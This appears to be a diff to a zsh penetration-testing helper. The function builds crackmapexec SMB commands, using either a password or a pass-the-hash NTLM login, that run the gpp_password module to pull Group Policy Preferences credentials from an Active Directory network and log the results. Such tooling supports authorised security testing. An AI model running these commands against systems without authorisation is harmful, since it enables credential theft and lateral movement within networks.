@@ -53,8 +53,24 @@ nb-ad-gpp-cme() {
     __check-project
     __check-network
 	  __check-user
-    __ask "Enter the NT:LM SAM hash for authentication"
-    __check-hash
+    __check-domain
+    echo
 
-    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M gpp_password"
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        echo
+        __ask "Enter a password for authentication"
+        __check-pass
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} -M gpp_password | tee -a $(__netadpath)/cme-sweep.txt"
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NT:LM hash for authentication"
+        __check-hash
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M gpp_password | tee -a $(__netadpath)/cme-sweep.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
 }
